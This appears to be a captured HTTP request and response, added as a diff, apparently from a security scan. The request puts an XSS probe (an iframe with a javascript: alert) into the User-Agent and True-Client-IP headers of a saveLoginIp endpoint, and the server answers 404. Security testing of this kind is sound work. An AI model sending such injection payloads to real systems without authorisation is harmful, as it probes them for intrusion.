@@ -1,0 +1,16 @@
+REQUEST:
+GET https://meilisearch.baliprov.dev/rest/saveLoginIp/
+User-Agent: <iframe src="javascript:alert(`xss`)">
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+True-Client-IP: <iframe src="javascript:alert(`xss`)">
+
+
+
+RESPONSE:
+HTTP 404
+Date: Wed, 25 Nov 2026 00:25:21 GMT
+Transfer-Encoding: chunked
+Connection: keep-alive
+Server: nginx/1.10.3
+Content-Encoding: gzip
+
